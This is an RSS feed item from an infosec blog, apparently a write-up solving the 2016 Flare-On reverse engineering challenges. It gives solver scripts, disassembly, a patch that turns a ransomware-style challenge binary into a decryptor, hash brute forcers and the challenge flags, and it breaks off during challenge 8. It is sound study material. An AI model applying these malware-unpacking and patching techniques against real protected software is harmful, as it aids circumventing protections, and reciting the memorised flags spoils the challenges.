<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Ctf on Infosec Blog</title>
    <link>http://mislusnys.github.io/categories/ctf/</link>
    <description>Recent content in Ctf on Infosec Blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Sun, 06 Nov 2016 18:56:21 +0100</lastBuildDate>
    <atom:link href="http://mislusnys.github.io/categories/ctf/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Flare-On Reversing Challenges 2016</title>
      <link>http://mislusnys.github.io/blog/2016/11/06/flare-on-reversing-challenges-2016/</link>
      <pubDate>Sun, 06 Nov 2016 18:56:21 +0100</pubDate>
      
      <guid>http://mislusnys.github.io/blog/2016/11/06/flare-on-reversing-challenges-2016/</guid>
      <description>

&lt;h2 id=&#34;intro:5c1cd4daab3156a0b511ae43c87fef01&#34;&gt;Intro&lt;/h2&gt;

&lt;p&gt;This autumn FireEye&amp;rsquo;s FLARE team hosted its third annual Flare-On Challenge.
Flare-On is purely reverse engineering based CTF targeting malware analysts and
security professionals. This year there were ten challenges and even though
all very different, most of them were crypto related.&lt;/p&gt;

&lt;p&gt;This post will present my solutions to all the challenges.&lt;/p&gt;

&lt;p&gt;I don&amp;rsquo;t go into a lot of detail in most of the solutions and mostly just present the
general idea of the individual challenge. If you are interested in a very detailed explanations,
you can check out the official solutions &lt;a href=&#34;https://www.fireeye.com/blog/threat-research/2016/11/2016_flare-on_challe.html&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#ch1&#34;&gt;Challenge 1 (challenge1)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#ch2&#34;&gt;Challenge 2 (DudeLocker)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#ch3&#34;&gt;Challenge 3 (unknown)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#ch4&#34;&gt;Challenge 4 (flareon2016challenge)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#ch5&#34;&gt;Challenge 5 (smokestack)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#ch6&#34;&gt;Challenge 6 (khaki)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#ch7&#34;&gt;Challenge 7 (hashes)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#ch8&#34;&gt;Challenge 8 (CHIMERA)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#ch9&#34;&gt;Challenge 9 (GUI)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#ch10&#34;&gt;Challenge 10 (flava)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;a-name-ch1-a-challenge-1:5c1cd4daab3156a0b511ae43c87fef01&#34;&gt;&lt;a name=&#34;ch1&#34;&gt;&lt;/a&gt;Challenge #1&lt;/h3&gt;

&lt;p&gt;Challenge1.exe is a standard win32 console application which asks for a password (presumably our flag)
and prints a message:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2016/11/06/ch1.png&#34; alt=&#34;Challenge1&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Upon opening the binary in IDA we realize that the program logic is quite simple - the password
is base64 encoded and compared to a hardcoded value. The only gotcha here is that the binary is
using a custom alphabet to do the encoding.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2016/11/06/ch1_ida.png&#34; alt=&#34;Custom base64&#34; /&gt;&lt;/p&gt;

&lt;p&gt;This python script translates between the two alphabets and base64 decodes our flag:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import string
import base64

encoded = &#39;x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q&#39;

custom_b64 = &#39;ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/&#39;
std_b64 = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#39;

encoded = encoded.translate(string.maketrans(custom_b64, std_b64))
flag = base64.b64decode(encoded)

print flag
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2016/11/06/ch1_flag.png&#34; alt=&#34;Flag&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;sh00ting_phish_in_a_barrel@flare-on.com&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&#34;a-name-ch2-a-challenge-2:5c1cd4daab3156a0b511ae43c87fef01&#34;&gt;&lt;a name=&#34;ch2&#34;&gt;&lt;/a&gt;Challenge #2&lt;/h3&gt;

&lt;p&gt;The second challenge consists of &lt;code&gt;DudeLocker.exe&lt;/code&gt; and &lt;code&gt;BusinessPapers.doc&lt;/code&gt; files. The .doc file in not a valid
MS Word document and seems to be encrypted with the provided executable.&lt;/p&gt;

&lt;p&gt;Stepping through the code with Immunity Debugger, we can see that it only encrypts files which are inside a &lt;code&gt;Briefcase&lt;/code&gt;
folder on the current user&amp;rsquo;s Desktop.
There is also a hard drive volume&amp;rsquo;s serial number check against a hardcoded value of &lt;code&gt;7DAB1D35&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;If these checks pass, the locker encrypts all the files inside the Briefcase folder and drops
a &lt;em&gt;ve_vant_ze_money.jpg&lt;/em&gt; ransom note:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2016/11/06/ve_vant_ze_money.jpg&#34; alt=&#34;Ransom Note&#34; /&gt;&lt;/p&gt;

&lt;p&gt;The files are encrypted using standard Microsoft Crypto API. The &lt;code&gt;CryptDeriveKey&lt;/code&gt; is used to set up the encryption
key, which in this case is 256 bit AES.
The MSDN states:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;The CryptDeriveKey function generates cryptographic session keys derived from a base data value. This function guarantees that when the same cryptographic service provider (CSP) and algorithms are used, the keys generated from the same base data are identical. The base data can be a password or any other user data.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Next, the &lt;code&gt;CryptEncrypt&lt;/code&gt; call is used to encrypt the files.&lt;/p&gt;

&lt;p&gt;So, given that it&amp;rsquo;s an AES encryption and the &lt;code&gt;CryptDeriveKey&lt;/code&gt; gives us the same key that was used for encryption -
we can replace the &lt;code&gt;CryptEncrypt&lt;/code&gt; call with &lt;code&gt;CryptDecrypt&lt;/code&gt; and produce a new binary which
decrypts files encrypted with DudeLocker.exe.&lt;/p&gt;

&lt;p&gt;So, I added the missing &lt;code&gt;CryptDecrypt&lt;/code&gt; call to the binary&amp;rsquo;s import table and
patched the executable to decrypt the files. The decryption call takes one
parameter less than the encryption one, so I NOP&amp;rsquo;ed one push to the stack as well:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2016/11/06/ch2_decrypt.png&#34; alt=&#34;Decryptor&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Next, I modified the C: drive&amp;rsquo;s serial
number to match the hardcoded one using Sysinternal&amp;rsquo;s &lt;code&gt;VolumeId&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Now, we can use our brand new decryption tool to decrypt the encrypted .doc file, which turns
out to be a jpeg with our flag:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2016/11/06/ch2_flag.jpg&#34; alt=&#34;Flag&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;cl0se_t3h_f1le_0n_th1s_0ne@flare-on.com&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&#34;a-name-ch3-a-challenge-3:5c1cd4daab3156a0b511ae43c87fef01&#34;&gt;&lt;a name=&#34;ch3&#34;&gt;&lt;/a&gt;Challenge #3&lt;/h3&gt;

&lt;p&gt;The third challenge is a win32 binary literally called &lt;code&gt;unknown&lt;/code&gt;. Upon opening
it in IDA we get our first clue:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2016/11/06/ch3_pdb.png&#34; alt=&#34;Extraspecial.pdb&#34; /&gt;&lt;/p&gt;

&lt;p&gt;After initial analysis and some debugging, we realize that the binary does some
calculations/hashing using the program&amp;rsquo;s name. There&amp;rsquo;s also a check for the
letter &lt;code&gt;r&lt;/code&gt; in the name of the program. Given all these clues, we &lt;strong&gt;must&lt;/strong&gt; deduce, that the
original binary name must have been &lt;code&gt;extraspecial.exe&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;With that out of the way, the interesting part is shown in IDA below:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2016/11/06/ch3_ida.png&#34; alt=&#34;IDA&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Here, the program uses our input (which needs to be 0x1A or 26 chars long) to calculate
checksums and compares them with the memory values which were computed using the
binary&amp;rsquo;s name. The cheksums are calculated in a loop and use one char of our
input per checksum.&lt;/p&gt;

&lt;p&gt;I have dumped the 4 * 26 bytes of memory that is used to check our flag from the
debugger and used that to write a python script which finds our flag one char
at a time. A couple notes on the script: First, the hexdump is already in a convenient little endian format and
second, the script uses numpy&amp;rsquo;s &lt;code&gt;uint32&lt;/code&gt; for the checksum as it perfectly emulates C style overflow of 32 bit
integers (python&amp;rsquo;s standard behaviour is to extend 32 bit values to 64 bit if they happen to overflow, which
is NOT desireable in this case).&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import struct
import numpy as np
import binascii

flare = &#39;FLARE On!&#39;
start = 0x60

hexdump = &#39;2F3E61EE45EB79DE3D2F1BAFD7BB47879CC49A73AEF5A4C9C1C53246249B02A0595016D65194B7A6BA239DE7CE92AE8A181A99859958E0FE94790C436FF3B91A8124C470CF27BD056F6EFFC47C84775AB37792DDFF3C842544A9DC5F9628E48EC761E92ADA3177A7&#39;
hexdump = hexdump.lower()
hexlist = [hexdump[i*8:(i+1)*8] for i in xrange(0x1a)]

def checksum(str):
    result = np.uint32(0)
    for char in str:
        result = np.uint32(ord(char) + 37 * result)
    return result

flag = &#39;&#39;
for i in xrange(0x1a):
    for char in xrange(0x20, 0x7f):
        concat = chr(char) + chr(start) + flare 
        sum = checksum(concat)
        hexsum = binascii.hexlify(sum)
        if hexsum == hexlist[i]:
            flag += chr(char)
            break
    start += 1

print flag
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;Ohs0pec1alpwd@flare-on.com&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&#34;a-name-ch4-a-challenge-4:5c1cd4daab3156a0b511ae43c87fef01&#34;&gt;&lt;a name=&#34;ch4&#34;&gt;&lt;/a&gt;Challenge #4&lt;/h3&gt;

&lt;p&gt;Challenge #4 is a dll file called &lt;code&gt;flareon2016challenge.dll&lt;/code&gt;. The dll has 51 exported functions, all of them
exported by the ordinal #.&lt;/p&gt;

&lt;p&gt;Export #51 has some kind of decryption call &lt;code&gt;sub_10001000&lt;/code&gt; which is dependant on calling exports 1-48 in some
kind of order prior to calling the #51:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2016/11/06/ch4_export51.png&#34; alt=&#34;Export 51&#34; /&gt;&lt;/p&gt;

&lt;p&gt;A closer inspection of exports 1-48 reveals that they all return values in the range 1-51 and all of them -
different from each other. This suggests that the order of the calls depends on the return values of the calls
themselves. So if the #51 was to be called the last, then the previous one would have to be the one returning 51 and
so on. Walking backwards all the way, we find that we need to start with the #30 and just call others based on the
return value.&lt;/p&gt;

&lt;p&gt;One of the easier ways to do that is from a python script:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from ctypes import *

mydll = cdll.LoadLibrary(&amp;quot;C:\\flareon2016challenge.dll&amp;quot;)
i = 30
while True:
    print &amp;quot;Calling: &amp;quot;, i
    i = mydll[i]()
    if i == 51:
        break
mydll[51]()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;While debugging, I would insert a &lt;code&gt;time.sleep(10)&lt;/code&gt; call before the export #51 itself, to be able to
attach a debugger and trace the decryption. As can be seen from the &lt;code&gt;MZ&lt;/code&gt; header, the decrypted blob
is actually an executable:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2016/11/06/ch4_decrypted.png&#34; alt=&#34;Decrypted&#34; /&gt;&lt;/p&gt;

&lt;p&gt;After dumping the exe from memory, it turns out to have our secret melody which provides the parameters for
the export #50:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2016/11/06/ch4_tune.png&#34; alt=&#34;Tune&#34; /&gt;&lt;/p&gt;

&lt;p&gt;With this information we can finish the script and (after a nice tune) get our flag.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from ctypes import *

mydll = cdll.LoadLibrary(&amp;quot;C:\\flareon2016challenge.dll&amp;quot;)
i = 30
while True:
    i = mydll[i]()
    if i == 51:
        break
mydll[51]()

mydll[50](0x1B8, 0x1F4)
mydll[50](0x1B8, 0x1F4)
mydll[50](0x1B8, 0x1F4)
mydll[50](0x15D, 0x15E)
mydll[50](0x20B, 0x96)
mydll[50](0x1B8, 0x1F4)
mydll[50](0x15D, 0x15E)
mydll[50](0x20B, 0x96)
mydll[50](0x1B8, 0x3E8)
mydll[50](0x293, 0x1F4)
mydll[50](0x293, 0x1F4)
mydll[50](0x293, 0x1F4)
mydll[50](0x2BA, 0x15E)
mydll[50](0x20B, 0x96)
mydll[50](0x19F, 0x1F4)
mydll[50](0x15D, 0x15E)
mydll[50](0x20B, 0x96)
mydll[50](0x1B8, 0x3E8)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2016/11/06/ch4_flag.png&#34; alt=&#34;Flag&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;f0ll0w_t3h_3xp0rts@flare-on.com&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&#34;a-name-ch5-a-challenge-5:5c1cd4daab3156a0b511ae43c87fef01&#34;&gt;&lt;a name=&#34;ch5&#34;&gt;&lt;/a&gt;Challenge #5&lt;/h3&gt;

&lt;p&gt;Challenge #5 is a windows binary named &lt;code&gt;smokestack.exe&lt;/code&gt;. Initial inspection in
IDA shows that it expects a command line argument that is at least 10
characters long:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2016/11/06/ch5_arg.png&#34; alt=&#34;Arg&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Next, the argument is placed in a global array of WORDS at &lt;code&gt;0x40DF20&lt;/code&gt;. Then the
interesting part happens inside the function &lt;code&gt;sub_401610&lt;/code&gt;. This function sets
up an index of functions to be called later, initializes some global variables
and executes the main loop:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2016/11/06/ch5_loop.png&#34; alt=&#34;Loop&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Inside the loop the program calls &lt;code&gt;sub_401540&lt;/code&gt; which uses previously
initialized index of functions to perform operations on our initial input. Now,
the most called functions seem to be &lt;code&gt;sub_401000&lt;/code&gt; and &lt;code&gt;sub_401080&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;.text:00401000                 push    ebp
.text:00401001                 mov     ebp, esp
.text:00401003                 mov     ax, word_40DF1C
.text:00401009                 add     ax, 1
.text:0040100D                 mov     word_40DF1C, ax
.text:00401013                 movzx   ecx, word_40DF1C
.text:0040101A                 mov     dx, [ebp+arg_0]
.text:0040101E                 mov     word_40DF20[ecx*2], dx
.text:00401026                 pop     ebp
.text:00401027                 retn

.text:00401080                 push    ebp
.text:00401081                 mov     ebp, esp
.text:00401083                 push    ecx
.text:00401084                 movzx   eax, word_40DF1C
.text:0040108B                 mov     cx, word_40DF20[eax*2]
.text:00401093                 mov     [ebp+var_4], cx
.text:00401097                 mov     dx, word_40DF1C
.text:0040109E                 sub     dx, 1
.text:004010A2                 mov     word_40DF1C, dx
.text:004010A9                 mov     ax, [ebp+var_4]
.text:004010AD                 mov     esp, ebp
.text:004010AF                 pop     ebp
.text:004010B0                 retn
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The first function takes an argument and stores it at the end
of our global array and the second function does the opposite - returns the
last value and decrements the pointer. These functions effectively act like
PUSH and POP operations on our global array (smokestack). They could be
implemented in python like the following:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def sub_401000(char):
    global v3
    global key
    v3 += 1
    key[v3] = char
    return v3 + 1

def sub_401080():
    global v3
    r = key[v3]
    v3 -= 1
    return r
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So, similarly to the functions above, I have implemented all 14 index functions and the surrounding
program logic into a huge unpythonic program. The last part shown below uses the implemented functions to
calculate the correct argument:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;## Key calculation
arg = &#39;&#39;
for i in reversed(xrange(10)):
    reset_()
    first = sub_401610()
    for ch in xrange(0x21, 0x7f):
        reset_()
        key[i] = ch
        r = sub_401610()
        if r != first:
            arg += chr(ch)
            final_key[i] = ch
            break

print arg[::-1]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now, the whole script is too big to be posted here (you can find it on &lt;a href=&#34;https://github.com/mislusnys/ctfs/tree/master/flareon3&#34;&gt;github&lt;/a&gt;,
along with other scripts). The final result:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2016/11/06/ch5_key.png&#34; alt=&#34;Flag&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;A_p0p_pu$H_&amp;amp;_a_Jmp@flare-on.com&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&#34;a-name-ch6-a-challenge-6:5c1cd4daab3156a0b511ae43c87fef01&#34;&gt;&lt;a name=&#34;ch6&#34;&gt;&lt;/a&gt;Challenge #6&lt;/h3&gt;

&lt;p&gt;For #6 we have a windows binary called &lt;code&gt;khaki.exe&lt;/code&gt;. When executed - it presents
us with a guessing game:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2016/11/06/ch6_guess.png&#34; alt=&#34;Challenge6&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Initial analysis of the strings shows that it is a binary compiled
with &lt;code&gt;py2exe&lt;/code&gt;. Normally, we would decompile the
binary with &lt;code&gt;uncompyle&lt;/code&gt; or a similar decompiler and get the python source code.
However, in this case the decompilation fails due to some unknown
modifications in the binary. A quick google search finds a FLARE blog &lt;a href=&#34;https://www.fireeye.com/blog/threat-research/2016/05/deobfuscating_python.html&#34;&gt;post&lt;/a&gt; about this
particular issue. As it turns out, the python bytecode was manually manipulated to
prevent easy decompilation. The blog post goes into great detail about the
issue and provides a tool which enables us to get a clean decompile. With the
help of the provided tool, we get the python source:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import sys, random
__version__ = &#39;Flare-On ultra python obfuscater 2000&#39;
target = random.randint(1, 101)
count = 1
error_input = &#39;a&#39;
while True:
    print &#39;(Guesses: %d) Pick a number between 1 and 100:&#39; % count,
    input = sys.stdin.readline()
    try:
        input = int(input, 0)
    except:
        error_input = input
        print &#39;Invalid input: %s&#39; % error_input
        continue

    if target == input:
        break
    if input &amp;lt; target:
        print &#39;Too low, try again&#39;
    else:
        print &#39;Too high, try again&#39;
    count += 1

if target == input:
    win_msg = &#39;Wahoo, you guessed it with %d guesses\n&#39; % count
    sys.stdout.write(win_msg)
if count == 1:
    print &#39;Status: super guesser %d&#39; % count
    sys.exit(1)
if count &amp;gt; 25:
    print &#39;Status: took too long %d&#39; % count
    sys.exit(1)
else:
    print &#39;Status: %d guesses&#39; % count
if error_input != &#39;&#39;:
    tmp = &#39;&#39;.join((chr(ord(x) ^ 66) for x in error_input)).encode(&#39;hex&#39;)
    if tmp != &#39;312a232f272e27313162322e372548&#39;:
        sys.exit(0)
    stuffs = [67, 139, 119, 165, 232, 86, 207, 61, 79, 67, 45, 58, 230, 190,
     181, 74, 65, 148, 71, 243, 246, 67, 142, 60, 61, 92, 58, 115, 240, 226, 171]

    import hashlib
    stuffer = hashlib.md5(win_msg + tmp).digest()
    for x in range(len(stuffs)):
        print chr(stuffs[x] ^ ord(stuffer[x % len(stuffer)])),

    print
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As we can see, the program expects us to guess a random number in a certain
number of tries as well as provide a certain bad input (&amp;lsquo;shameless plug&amp;rsquo;
- a reference to the FLARE blog post) for
one of those tries. I have reduced this code to only the relevant part, looping
through possible number of guesses, one of which produces our flag:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import hashlib

tmp = &#39;312a232f272e27313162322e372548&#39;
stuffs = [67, 139, 119, 165, 232, 86, 207, 61,
79, 67, 45, 58, 230, 190, 181, 74, 65, 148, 71,
243, 246, 67, 142, 60, 61, 92, 58, 115, 240, 226, 171]

for count in xrange(25):
    win_msg = &#39;Wahoo, you guessed it with %d guesses\n&#39; % count
    stuffer = hashlib.md5(win_msg + tmp).digest()
    s = &#39;&#39;
    for x in range(len(stuffs)):
        s += chr(stuffs[x] ^ ord(stuffer[x % len(stuffer)]))

    print s
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2016/11/06/ch6_flag.png&#34; alt=&#34;Flag&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;1mp0rt3d_pygu3ss3r@flare-on.com&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&#34;a-name-ch7-a-challenge-7:5c1cd4daab3156a0b511ae43c87fef01&#34;&gt;&lt;a name=&#34;ch7&#34;&gt;&lt;/a&gt;Challenge #7&lt;/h3&gt;

&lt;p&gt;Challenge #7 is a linux binary named &lt;code&gt;hashes&lt;/code&gt;. Upon trying to run the binary
for the first time it becomes evident (missing libgo.so.7) that it was written in Go programming
language. After installing required dependency (libgo7) and setting up remote
linux debugging with IDA, we can dive into the workings of this binary. Now,
analyzing and debugging Go binaries is quite confusing, because of the use of
&lt;code&gt;channels&lt;/code&gt; and strange stack manipulations while calling functions. After
fighting with this for a while, we find the interesting parts:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2016/11/06/ch7_trip_sha1.png&#34; alt=&#34;SHA-1&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Here, the program &lt;code&gt;slices&lt;/code&gt; the program argument (which should be 30 chars long)
into 5 pieces and calculates a triple SHA1 hash on each of them. Later, it compares the results to
effectively hardcoed values (by using a lookup). In order to calculate our
flag, we have to brute force the hashes. The task is quite feasible given that
our inputs are only 6 chars long and there&amp;rsquo;s a nice limitation on possible
characters inside the program:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2016/11/06/ch7_chars.png&#34; alt=&#34;Chars&#34; /&gt;&lt;/p&gt;

&lt;p&gt;A part of the script that cracks the hashes is shown below. We could decrease the cracking time
by using the information that all the flags in this challenge end with &lt;code&gt;@flare-on.com&lt;/code&gt;, however,
on my laptop the whole bruteforcing time was ~20min, so not a huge loss there.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def trip_sha1(s):
        return hashlib.sha1(hashlib.sha1((hashlib.sha1(s).digest())).digest()).hexdigest()

const = 0x1cd
current = 0x450

hashes = [[],[],[],[],[]]

for h in reversed(xrange(5)):
    for b in xrange(20):
        byte = blob[current]
        current -= 0x1cd
        if current &amp;lt; 0:
            current += 0x1000
        hashes[h] = [byte] + hashes[h]

h_str = [binascii.hexlify(&#39;&#39;.join([chr(b) for b in h])) for h in hashes]

alphabet = &#39;abcdefghijklmnopqrstuvwxyz@-._1234&#39;

# We have the hashes, need to crack them

for c1 in alphabet:
    for c2 in alphabet:
        for c3 in alphabet:
            for c4 in alphabet:
                for c5 in alphabet:
                    for c6 in alphabet:
                        six = &#39;&#39;.join([c1,c2,c3,c4,c5,c6])
                        if trip_sha1(six) in h_str:
                            print six, trip_sha1(six)

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Combining all the cracked pieces together we get the flag:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;h4sh3d_th3_h4sh3s@flare-on.com&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&#34;a-name-ch8-a-challenge-8:5c1cd4daab3156a0b511ae43c87fef01&#34;&gt;&lt;a name=&#34;ch8&#34;&gt;&lt;/a&gt;Challenge #8&lt;/h3&gt;

&lt;p&gt;Challenge #8 is a file called &lt;code&gt;CHIMERA.EXE&lt;/code&gt;. This one was a favourite challenge of many participants. It has
a very clever twist which caught many people (myself included) of guard. As it turns out, the binary is both
a valid win32 application as well as a valid DOS 16-bit binary. There are a few subtle clues that point
to that discovery, one of which is the &amp;lsquo;This program cannot &lt;strong&gt;not&lt;/strong&gt; be run in DOS mode.&amp;rsquo; message&lt;br /&gt;
inside the DOS header. I will skip the 32bit part, as it is a dead end.&lt;/p&gt;

&lt;p&gt;To disassemble in 16bit mode, we have to specifically tell IDA to open the file as DOS executable.
Inside, we see some self-decrypting code:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;seg000:07C6 loc_107C6:                              ; CODE XREF: seg000:0009j
seg000:07C6                 mov     cx, 70h ; &#39;p&#39;
seg000:07C9
seg000:07C9 loc_107C9:                              ; CODE XREF: seg000:07D2j
seg000:07C9                 mov     bx, cx
seg000:07CB                 dec     bx
seg000:07CC                 add     bx, bx
seg000:07CE                 add     [bx+7D4h], cx
seg000:07D2                 loop    loc_107C9
seg000:07D4
seg000:07D4 loc_107D4:                              ; CODE XREF: seg000:loc_107D4j
seg000:07D4                 jmp     short near ptr loc_107D4+1
seg000:07D4 ; ---------------------------------------------------------------------------
seg000:07D6                 db 0BEh, 0B8h, 0FDh, 29h, 0C9h, 21h, 7Ch, 0E9h, 0C0h, 7
seg000:07D6                 db 8, 8Fh, 0C4h, 0, 0B1h, 0EBh, 0FCh, 73h, 0F8h, 74h, 0F5h
seg000:07D6                 db 0E7h, 0A7h, 9, 0BFh, 21h, 0ABh, 5Eh, 0F7h, 0B3h, 0F9h
seg000:07D6                 db 74h, 0F2h, 73h, 0EFh, 82h, 0B0h, 0CDh, 0Ch, 31h, 0B3h
seg000:07D6                 db 74h, 0EAh, 2Ch, 9Ah, 97h, 71h, 26h, 45h, 7, 1Dh, 0E1h
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I have replicated the decryption routine in a small IDAPython script, which allows a further static
analysis into the binary:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import idc

st = idc.SelStart()

cx = 0x70
while cx &amp;gt; 0:
    bx = 2 * (cx - 1)
    temp = idc.Word(st + bx) + cx
    idc.PatchWord(st + bx, temp)
    cx -= 1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now the decrypted code shows up inside IDA:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2016/11/06/ch8_decrypted.png&#34; alt=&#34;Decrypted&#34; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, the code is still not correct as there a jumps landing in the middle of other instructions,
making them invalid. We can fix that quite easily by undefining (&amp;lsquo;U&amp;rsquo;) and redefining instructions as code (&amp;lsquo;C&amp;rsquo;)
in IDA. After fixing the first jumps, the code looks like this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2016/11/06/ch8_redefined.png&#34; alt=&#34;Corrected&#34; /&gt;&lt;/p&gt;

&lt;p&gt;After fixing all the decrypted code, I could analyze the workings of the program. In addition to reading the
disassembly I used a &lt;code&gt;DOSBox&lt;/code&gt; debugger to validate my findings and trace parts of the program.&lt;/p&gt;

&lt;p&gt;First, CHIMERA checks if the program is running after the year 1990 and exits if that&amp;rsquo;s the case. We can set
the clock back or (as I did) change it inside the debugger. Second, it reads an input string and after
encoding it, compares the result to a correct string&amp;rsquo;s encoded value.&lt;/p&gt;

&lt;p&gt;This python script reverses the encoding and finds our flag:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;target = [  
  0x38, 0xE1, 0x4A, 0x1B, 0x0C, 0x1A, 0x46, 0x46, 0x0A, 
  0x96, 0x29, 0x73, 0x73, 0xA4, 0x69, 0x03, 0x00, 0x1B, 
  0xA8, 0xF8, 0xB8, 0x24, 0x16, 0xD6, 0x09, 0xCB]

lookup = [
 0xFF, 0x15, 0x74, 0x20, 0x40, 0x00, 0x89, 0xEC, 0x5D, 0xC3, 
  0x42, 0x46, 0xC0, 0x63, 0x86, 0x2A, 0xAB, 0x08, 0xBF, 0x8C, 
  0x4C, 0x25, 0x19, 0x31, 0x92, 0xB0, 0xAD, 0x14, 0xA2, 0xB6, 
  0x67, 0xDD, 0x39, 0xD8, 0x5F, 0x3F, 0x7B, 0x5C, 0xC2, 0xB2, 
  0xF6, 0x2E, 0x75, 0x9B, 0x61, 0x94, 0xCF, 0xCE, 0x6A, 0x98, 
  0x50, 0xF2, 0x5B, 0xF0, 0x45, 0x30, 0x0E, 0x38, 0xEB, 0x3B, 
